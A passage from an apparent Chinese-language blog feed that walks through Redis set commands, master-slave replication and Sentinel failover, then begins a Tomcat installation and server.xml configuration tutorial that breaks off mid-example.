...]</span><br><span class="line">  summary: Add multiple sets and store the resulting set in a key</span><br><span class="line">  since: 1.0.0</span><br><span class="line">127.0.0.1:6379&gt; SADD stus tom jerry lilei hanmeimei lucy lily</span><br><span class="line">(integer) 6</span><br><span class="line">127.0.0.1:6379&gt; SPOP stus 2</span><br><span class="line">1) &quot;lily&quot;</span><br><span class="line">2) &quot;lilei&quot;</span><br><span class="line">127.0.0.1:6379&gt; SCARD stus</span><br><span class="line">(integer) 4</span><br><span class="line">127.0.0.1:6379&gt; smembers stus</span><br><span class="line">1) &quot;jerry&quot;</span><br><span class="line">2) &quot;hanmeimei&quot;</span><br><span class="line">3) &quot;tom&quot;</span><br><span class="line">4) &quot;lucy&quot;</span><br><span class="line">127.0.0.1:6379&gt; srem stus hanmeimei</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; smembers stus</span><br><span class="line">1) &quot;jerry&quot;</span><br><span class="line">2) &quot;tom&quot;</span><br><span class="line">3) &quot;lucy&quot;</span><br><span class="line">127.0.0.1:6379&gt; SADD stus2 tom jeryy lucy lilei</span><br><span class="line">(integer) 4</span><br><span class="line">127.0.0.1:6379&gt; sinter stus stus2</span><br><span class="line">1) &quot;tom&quot;</span><br><span class="line">2) &quot;lucy&quot;</span><br><span class="line">127.0.0.1:6379&gt; sunion stus stus2</span><br><span class="line">1) &quot;jerry&quot;</span><br><span class="line">2) &quot;lilei&quot;</span><br><span class="line">3) &quot;jeryy&quot;</span><br><span class="line">4) &quot;tom&quot;</span><br><span class="line">5) &quot;lucy&quot;</span><br><span class="line">127.0.0.1:6379&gt; sdiff stus stus2</span><br><span class="line">1) &quot;jerry&quot;</span><br><span class="line">127.0.0.1:6379&gt; sdiff stus2 stus</span><br><span class="line">1) &quot;lilei&quot;</span><br><span class="line">2) &quot;jeryy&quot;</span><br></pre></td></tr></table></figure><h1 id="redis主从"><a href="#redis主从" class="headerlink" title="redis主从"></a>redis主从</h1><blockquote><p>Redis支持将数据同步到多台从库上，这种特性对提高读取性能非常有益。master可以有多个slave。除了多个slave连到相同的master外，slave也可以连接其它slave形成图状结构。主从复制不会阻塞master。也就是说当一个或多个slave与master进行初次同步数据时，master可以继续处理客户端发来的请求。相反slave在初次同步数据时则会阻塞不能处理客户端的请求。</p><p>主从复制可以用来提高系统的可伸缩性,我们可以用多个slave 专门用于客户端的读请求，比如sort操作可以使用slave来处理。也可以用来做简单的数据冗余。可以在 master 禁用数据持久化，只需要注释掉 master 配置文件中的所有 save 配置，然后只在 slave 上配置数据持久化。</p></blockquote><ul><li>redis cluster</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">master 192.168.1.18</span><br><span class="line">slave 192.168.1.28</span><br></pre></td></tr></table></figure><ul><li>master相关配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">]# yum install -y redis</span><br><span class="line">]# grep &apos;^[^#]&apos; /etc/redis.conf</span><br><span class="line">bind 0.0.0.0 #保证protected-mode不运行</span><br><span class="line">requirepass ilinux </span><br><span class="line">]# systemctl start redis</span><br></pre></td></tr></table></figure><ul><li>slave相关配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">]# yum install -y redis</span><br><span class="line">]# vim /etc/redis.conf   #仅修改以下选项</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">requirepass ilinux</span><br><span class="line">slaveof 192.168.1.18 6379</span><br><span class="line">masterauth ilinux</span><br><span class="line">]# systemctl start redis</span><br><span class="line">]# redis-cli -a ilinux</span><br><span class="line">127.0.0.1:6379&gt; INFO replication</span><br><span class="line"># Replication</span><br><span class="line">role:master</span><br><span class="line">connected_slaves:1</span><br><span class="line">slave0:ip=192.168.1.28,port=6379,state=online,offset=77446,lag=1</span><br></pre></td></tr></table></figure><p>Redis的主从配置相当简单，相对于mysql的冗杂。</p><h1 id="Redis-HA的sentinel方案"><a href="#Redis-HA的sentinel方案" class="headerlink" title="Redis-HA的sentinel方案"></a>Redis-HA的sentinel方案</h1><p>试验环境如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--------------------</span><br><span class="line">Arch        : x86_64</span><br><span class="line">--------------------</span><br><span class="line">centos 7.5</span><br><span class="line">--------------------</span><br><span class="line">master 192.168.1.18</span><br><span class="line">node01 192.168.1.28</span><br><span class="line">node02 192.168.1.30</span><br></pre></td></tr></table></figure><p>redis 的高可用方案基于自己的一套sentinel 集群来管理。</p><p>先配置主从,修改配置文件<code>/etc/redis.conf</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">master节点</span><br><span class="line">]# </span><br><span class="line">]# vim /etc/redis.conf</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">requirepass ilinux</span><br><span class="line">node01节点</span><br><span class="line">]# vim /etc/redis.conf</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">requirepass ilinux</span><br><span class="line">slaveof 192.168.1.18 6379</span><br><span class="line">masterauth ilinux</span><br><span class="line">node01节点</span><br><span class="line">]# vim /etc/redis.conf</span><br><span class="line">bind 0.0.0.0</span><br><span class="line">requirepass ilinux</span><br><span class="line">slaveof 192.168.1.18 6379</span><br><span class="line">masterauth ilinux</span><br><span class="line">]# systemctl start redis  #三台主机全部启动redis服务。</span><br><span class="line">]# redis-cli -a ilinux</span><br><span class="line">127.0.0.1:6379&gt; INFO replication</span><br><span class="line"># Replication</span><br><span class="line">role:master</span><br><span class="line">connected_slaves:2</span><br><span class="line">slave0:ip=192.168.1.28,port=6379,state=online,offset=77446,lag=1</span><br><span class="line">slave1:ip=192.168.1.30,port=6379,state=online,offset=77446,lag=1</span><br><span class="line">master_repl_offset:77585</span><br><span class="line">repl_backlog_active:1</span><br><span class="line">repl_backlog_size:1048576</span><br><span class="line">repl_backlog_first_byte_offset:2</span><br><span class="line">repl_backlog_histlen:77584</span><br></pre></td></tr></table></figure><p>再配置HA，<code>/etc/redis-sentinel.conf</code>配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">]# vim /etc/redis-sentinel.conf  #修改以下选项</span><br><span class="line">bind 0.0.0.0   #否则要进行认证，保证protected-mode不运行</span><br><span class="line"># sentinel myid 65ca85904ebbf0dbf0d88b18c53a5ffedbedc8f9   #要用到scp，保证myid不重复。</span><br><span class="line">sentinel monitor mymaster 192.168.1.18 6379 2</span><br><span class="line">sentinel auth-pass mymaster ilinux</span><br><span class="line">]# scp /etc/redis-sentinel.conf node01:/etc/</span><br><span class="line">]# scp /etc/redis-sentinel.conf node02:/etc/</span><br><span class="line">]# systemctl start redis-sentinel.service</span><br></pre></td></tr></table></figure><p>高可用试验验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 26379</span><br><span class="line">127.0.0.1:26379&gt; sentinel masters #查看master信息，</span><br><span class="line">127.0.0.1:26379&gt; sentinel slaves mymaster  #mymaster 为集群名称</span><br><span class="line">]# systemctl stop redis   #停止主节点的redis服务。</span><br><span class="line">]# redis-cli -p 26379 </span><br><span class="line">127.0.0.1:26379&gt; sentinel masters#隔一段时间，查看信息。</span><br><span class="line">10) &quot;master,disconnected&quot;#主节点失联</span><br><span class="line">10）&quot;s_down,master,disconnected#主观_down</span><br><span class="line">10) &quot;s_down,o_down,master,disconnected&quot;#客观_down</span><br><span class="line">10）&quot;master&quot;  ##这里已经更换了主节点了。#switch-master</span><br><span class="line">#这里可以看日志更为详细</span><br><span class="line">]# tail -f /var/log/redis/sentinel.log </span><br><span class="line">2448:X 24 Jul 17:07:03.499 # +sdown master mymaster 192.168.1.18 6379</span><br><span class="line">2448:X 24 Jul 17:07:03.540 # +new-epoch 3</span><br><span class="line">2448:X 24 Jul 17:07:03.542 # +vote-for-leader 65ca85904ebbf0dbf0d88b18c53a5ffedbedc8f9 3</span><br><span class="line">2448:X 24 Jul 17:07:03.562 # +odown master mymaster 192.168.1.18 6379 #quorum 3/2</span><br><span class="line">2448:X 24 Jul 17:07:03.562 # Next failover delay: I will not start a failover before Tue Jul 24 17:13:04 2018</span><br><span class="line">2448:X 24 Jul 17:07:04.427 # +config-update-from sentinel 65ca85904ebbf0dbf0d88b18c53a5ffedbedc8f9 192.168.1.18 26379 @ mymaster 192.168.1.18 6379</span><br><span class="line">2448:X 24 Jul 17:07:04.427 # +switch-master mymaster 192.168.1.18 6379 192.168.1.30 6379</span><br><span class="line">2448:X 24 Jul 17:07:04.427 * +slave slave 192.168.1.18:6379 192.168.1.18 6379 @ mymaster 192.168.1.30 6379</span><br><span class="line">2448:X 24 Jul 17:07:04.427 * +slave slave 192.168.1.28:6379 192.168.1.28 6379 @ mymaster 192.168.1.30 6379</span><br><span class="line">2448:X 24 Jul 17:07:34.431 # +sdown slave 192.168.1.18:6379 192.168.1.18 6379 @ mymaster 192.168.1.30 6379</span><br><span class="line">2448:X 24 Jul 17:07:50.405 # -sdown slave 192.168.1.18:6379 192.168.1.18 6379 @ mymaster 192.168.1.30 6379</span><br></pre></td></tr></table></figure><p>当然，redis-HA方案有好几种，我们也可以用keepalived+VIP来实现，将master、backup、slave分离开来，master、backup自动VIP切换。 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="server" scheme="https://fenghong.tech/tags/server/"/>
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="internet" scheme="https://fenghong.tech/tags/internet/"/>
    
      <category term="NoSQL" scheme="https://fenghong.tech/tags/NoSQL/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat</title>
    <link href="https://fenghong.tech/tomcat.html"/>
    <id>https://fenghong.tech/tomcat.html</id>
    <published>2018-07-18T11:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘要：</p><ul><li>Tomcat相关的概念及安装</li><li>Tomcat的配置及解释</li><li>httpd/Nginx/Ajp下的tomcat集群实现</li><li>Mencached下的Tomcat会话存储</li></ul><h1 id="Tomcat相关概念"><a href="#Tomcat相关概念" class="headerlink" title="Tomcat相关概念"></a>Tomcat相关概念</h1><p>Tomcat是由Apache软件基金会下属的Jakarta项目开发的一个Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。由于Tomcat本身也内含了一个HTTP服务器，它也可以被视作一个单独的Web服务器。但是，不能将Tomcat和Apache HTTP服务器混淆，Apache HTTP服务器是一个用C语言实现的HTTPWeb服务器；这两个HTTP web server不是捆绑在一起的。Apache Tomcat包含了一个配置管理工具，也可以通过编辑XML格式的配置文件来进行配置。Tomcat是Java 2 EE技术体系的不完整实现。</p><p><img src="/images/jdk.png" alt="img"> </p><ul><li>JDK：java工具箱</li><li>JRE：java运行时环境</li><li>JVM：C语言研发，java虚拟机</li><li>ajp：AJP13是定向包协议，httpd支持此协议，nginx不支持</li><li>jsp：java server page</li><li>jasper：负责将.jsp 转换为 .java</li><li>applet：Applet或Java小应用程序是一种在Web环境下，运行于客户端的Java程序组件</li><li>servlet：全称Java Servlet， 是用Java编写的服务器端程序，其主要功能在于交互式地浏览和修改数据，生成动态Web内容，将.java转换成字节码</li></ul><h1 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h1><h2 id="yum包安装"><a href="#yum包安装" class="headerlink" title="yum包安装"></a>yum包安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># yum install java-1.8.0-openjdk</span><br><span class="line"># yum install tomcat tomcat-webapps tomcat-admin-webapps tomcat-docs-webapp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># java -version  #查看java版本信息</span><br><span class="line"># tomcat version  #查看tomcat版本信息</span><br></pre></td></tr></table></figure><p>启动服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># systemctl start tomcat</span><br><span class="line"># ss -tnl</span><br><span class="line">LISTEN      0      1        ::ffff:127.0.0.1:8005  #管理端口，建议关闭</span><br><span class="line">LISTEN      0      100        :::8009              #AJP协议默认监听端口</span><br><span class="line">LISTEN      0      100        :::8080              #HTTP协议默认监听端口</span><br></pre></td></tr></table></figure><p>tomcat的目录结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">配置文件目录：/etc/tomcat/</span><br><span class="line">主配置文件：server.xml</span><br><span class="line">webapps存放位置：/var/lib/tomcat/webapps/</span><br><span class="line">环境配置文件：/etc/sysconfig/tomcat</span><br></pre></td></tr></table></figure><h2 id="官方发行版安装"><a href="#官方发行版安装" class="headerlink" title="官方发行版安装"></a>官方发行版安装</h2><p>安装JDK：</p><p>下载地址：<code>http://www.oracle.com/technetwork/java/javase/downloads/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># rpm -ivh jdk-8u25-linux-x64.rpm</span><br><span class="line"># ll /usr/java/  #默认安装路径</span><br><span class="line">lrwxrwxrwx 1 root root  16 Jul 17 19:46 default -&gt; /usr/java/latest</span><br><span class="line">drwxr-xr-x 9 root root 268 Jul 17 19:46 jdk1.8.0_25</span><br><span class="line">lrwxrwxrwx 1 root root  21 Jul 17 19:46 latest -&gt; /usr/java/jdk1.8.0_25</span><br><span class="line"># vim /etc/profile.d/java.sh  #将java环境变量加入系统环境变量</span><br><span class="line">export JAVA_HOME=/usr/java/latest</span><br><span class="line">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class="line"># . /etc/profile.d/java.sh</span><br></pre></td></tr></table></figure><p>安装Tomcat：</p><p>下载地址：<code>http://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-8/v8.5.32/bin/apache-tomcat-8.5.32.tar.gz</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># useradd tomcat</span><br><span class="line"># tar xf apache-tomcat-8.5.32.tar.gz -C /usr/local/</span><br><span class="line"># cd /usr/local/</span><br><span class="line">local]# ln -sv apache-tomcat-8.5.32/ tomcat</span><br><span class="line">local]# cd tomcat/</span><br><span class="line">tomcat]# chgrp -R tomcat ./*</span><br><span class="line">tomcat]# chown -R tomcat logs/ temp/ work/</span><br><span class="line">tomcat]# chmod g+rx conf/</span><br><span class="line">tomcat]# chmod g+r conf/*</span><br><span class="line"># vim /etc/profile.d/tomcat.sh  #配置环境变量</span><br><span class="line">export CATALINA_BASE=/usr/local/tomcat</span><br><span class="line">export PATH=$CATALINA_BASE/bin:$PATH</span><br><span class="line"># . /etc/profile.d/tomcat.sh</span><br><span class="line"># su - tomcat -c &apos;catalina.sh start&apos;</span><br></pre></td></tr></table></figure><blockquote><p><code># ls -1 /usr/local/tomcat/</code><br>bin：脚本及启动时用到的类<br>conf：配置文件目录<br>lib：库文件，Java类库，jar<br>logs：日志文件目录<br>temp：临时文件目录<br>webapps：webapp的默认目录<br>work：工作目录</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># catalina.sh --help</span><br><span class="line">commands:</span><br><span class="line">  debug             #调试模式启动</span><br><span class="line">  jpda start        #jpda的debug模式启动</span><br><span class="line">  run               #前台启动</span><br><span class="line">  start             #后台启动</span><br><span class="line">  stop              #关闭</span><br><span class="line">  stop n            #n秒后关闭</span><br><span class="line">  stop -force       #强制关闭</span><br><span class="line">  stop n -force     #n秒后强制关闭</span><br><span class="line">  configtest        #测试配置文件语法</span><br><span class="line">  version           #查看相关版本信息</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># catalina.sh version</span><br><span class="line">Using CATALINA_BASE:   /usr/local/tomcat</span><br><span class="line">Using CATALINA_HOME:   /usr/local/tomcat</span><br><span class="line">Using CATALINA_TMPDIR: /usr/local/tomcat/temp</span><br><span class="line">Using JRE_HOME:        /usr/java/latest</span><br><span class="line">Using CLASSPATH:       /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar</span><br><span class="line">Server version: Apache Tomcat/8.5.32</span><br><span class="line">Server built:   Jun 20 2018 19:50:35 UTC</span><br><span class="line">Server number:  8.5.32.0</span><br><span class="line">OS Name:        Linux</span><br><span class="line">OS Version:     3.10.0-862.el7.x86_64</span><br><span class="line">Architecture:   amd64</span><br><span class="line">JVM Version:    1.8.0_25-b17</span><br><span class="line">JVM Vendor:     Oracle Corporation</span><br></pre></td></tr></table></figure><h2 id="manager、host-manager和docs"><a href="#manager、host-manager和docs" class="headerlink" title="manager、host-manager和docs"></a>manager、host-manager和docs</h2><p>依赖包：</p><ul><li>tomcat-webapps </li><li>tomcat-admin-webapps </li><li>tomcat-docs-webapp</li></ul><h3 id="配置：manager管理webapps应用程序"><a href="#配置：manager管理webapps应用程序" class="headerlink" title="配置：manager管理webapps应用程序"></a>配置：manager管理webapps应用程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vim /etc/tomcat/tomcat-users.xml</span><br><span class="line">&lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">&lt;user username=&quot;admin&quot; password=&quot;adminpass&quot; roles=&quot;manager-gui&quot;/&gt;</span><br><span class="line"># systemctl restart tomcat</span><br></pre></td></tr></table></figure><blockquote><p>访问：<a href="http://192.168.0.8:8080/manager/进入管理页面" target="_blank" rel="noopener">http://192.168.0.8:8080/manager/进入管理页面</a></p></blockquote><h3 id="配置：host-manager管理虚拟主机"><a href="#配置：host-manager管理虚拟主机" class="headerlink" title="配置：host-manager管理虚拟主机"></a>配置：host-manager管理虚拟主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># vim /etc/tomcat/tomcat-users.xml</span><br><span class="line">&lt;role rolename=&quot;admin-gui&quot;/&gt; </span><br><span class="line">&lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt;</span><br><span class="line"># systemctl restart tomcat</span><br></pre></td></tr></table></figure><blockquote><p>访问：<a href="http://192.168.0.10:8080/host-manager/进入管理页面" target="_blank" rel="noopener">http://192.168.0.10:8080/host-manager/进入管理页面</a></p></blockquote><h3 id="docs获取离线文档"><a href="#docs获取离线文档" class="headerlink" title="docs获取离线文档"></a>docs获取离线文档</h3><blockquote><p>访问：<a href="http://192.168.0.10:8080/docs/" target="_blank" rel="noopener">http://192.168.0.10:8080/docs/</a></p></blockquote><h2 id="Tomcat的配置参数"><a href="#Tomcat的配置参数" class="headerlink" title="Tomcat的配置参数"></a>Tomcat的配置参数</h2><ul><li>server.xml：主配置文件</li><li>web.xml：每个webapp只有“部署”后才能被访问，它的部署方式通常由web.xml进行定义，其存放位置为WEB-INF/目录中；此文件为所有的webapps提供默认部署相关的配置</li><li>context.xml：每个webapp都可以专用的配置文件，它通常由专用的配置文件context.xml来定义，其存放位置为WEB-INF/目录中；此文件为所有的webapps提供默认配置</li><li>tomcat-users.xml：用户认证的账号和密码文件</li><li>catalina.policy：当使用-security选项启动tomcat时，用于为tomcat设置安全策略</li><li>catalina.properties：Java属性的定义文件，用于设定类加载器路径，以及一些与JVM调优相关参数</li><li>logging.properties：日志系统相关的配置</li></ul><h3 id="tomcat的核心组件：server-xml"><a href="#tomcat的核心组件：server-xml" class="headerlink" title="tomcat的核心组件：server.xml"></a>tomcat的核心组件：server.xml</h3><p>配置文件框架：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;Server&gt;</span><br><span class="line">    &lt;Service&gt;</span><br><span class="line">        &lt;connector/&gt;</span><br><span class="line">        &lt;Engine&gt;</span><br><span class="line">            &lt;Host&gt;</span><br><span class="line">                &lt;Context&gt;</span><br><span class="line">                    &lt;Valve/&gt;</span><br><span class="line">                &lt;/Context/&gt;</span><br><span class="line">            &lt;/Host&gt;</span><br><span class="line">        &lt;/Engine&gt;</span><br><span class="line">    &lt;/Service&gt;</span><br><span class="line">&lt;/Server&gt;</span><br></pre></td></tr></table></figure><p>每一个组件都由一个Java“类”实现，这些组件大体可分为以下几个类型：</p><ul><li>顶级组件：Server</li><li>服务类组件：Service</li><li>连接器组件：http, https, ajp（apache jserv protocol）</li><li>容器类：Engine, Host, Context</li><li>被嵌套类：valve, logger, realm, loader, manager, …</li><li>集群类组件：listener, cluster, …</li></ul><h3 id="Tomcat的常用组件配置："><a href="#Tomcat的常用组件配置：" class="headerlink" title="Tomcat的常用组件配置："></a>Tomcat的常用组件配置：</h3><ul><li>Server：代表tomcat instance，即表现出的一个java进程；监听在8005端口，只接收“SHUTDOWN”。各server监听的端口不能相同，因此，在同一物理主机启动多个实例时，需要修改其监听端口为不同的端口；</li><li>Service：用于实现将一个或多个connector组件关联至一个engine组件；</li><li>Connector组件：负责接收请求，常见的有三类http/https/ajp；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">port=&quot;8080&quot; 监听的端口</span><br><span class="line">protocol=&quot;HTTP/1.1&quot; 协议</span><br><span class="line">connectionTimeout=&quot;20000&quot; 连接超时时间，单位ms，2秒</span><br><span class="line">address：监听的IP地址；默认为本机所有可用地址；</span><br><span class="line">maxThreads：最大并发连接数，默认为200；</span><br><span class="line">enableLookups：是否启用DNS查询功能；</span><br><span class="line">acceptCount：等待队列的最大长度；</span><br><span class="line">secure：安全相关;</span><br><span class="line">sslProtocol：加密传输相关;</span><br></pre></td></tr></table></figure><ul><li>Engine组件：Servlet实例，即servlet引擎，其内部可以一个或多个host组件来定义站点； 通常需要通过defaultHost属性来定义默认的虚拟主机；</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=</span><br><span class="line">defaultHost=&quot;localhost&quot;</span><br><span class="line">jvmRoute=</span><br></pre></td></tr></table></figure><ul><li>Host组件：位于engine内部用于接收请求并进行相应处理的主机或虚拟主机</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Host name=&quot;localhost&quot;  appBase=&quot;webapps&quot;</span><br><span class="line">      unpackWARs=&quot;true&quot; autoDeploy=&quot;true&quot;&gt;</span><br><span class="line">&lt;/Host&gt;</span><br><span class="line">appBase：此Host的webapps的默认存放目录，指存放非归档的web应用程序的目录或归档的WAR文件目录路径；可以使用基于$CATALINA_BASE变量所定义的路径的相对路径；</span><br><span class="line">autoDeploy：在Tomcat处于运行状态时，将某webapp放置于appBase所定义的目录中时，是否自动将其部署至tomcat；</span><br></pre></td></tr></table></figure><ul><li>Context组件：相当于nginx中的alias的功能</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context path=&quot;/PATH&quot; docBase=&quot;/PATH/TO/SOMEDIR&quot; reloadable=&quot;&quot;/&gt;</span><br><span class="line">path:url路径</span><br><span class="line">docBase:网页文件目录路径</span><br></pre></td></tr></table></figure><ul><li>Valve组件：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">定义访问日志：org.apache.catalina.valves.AccessLogValve</span><br><span class="line">&lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot;</span><br><span class="line">       prefix=&quot;localhost_access_log.&quot; suffix=&quot;.txt&quot;</span><br><span class="line">       pattern=&quot;%h %l %u %t &amp;quot;%r&amp;quot; %s %b&quot; /&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">定义访问控制：org.apache.catalina.valves.RemoteAddrValve</span><br><span class="line">&lt;Valve className=&quot;org.apache.catalina.valves.RemoteAddrValve&quot; deny=&quot;172\.16\.100\.67&quot;/&gt;</span><br></pre></td></tr></table></figure><h3 id="组件配置示例："><a href="#组件配置示例：" class="headerlink" title="组件配置示例："></a>组件配置示例：</h3><ul><li>配置示例：Host组件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 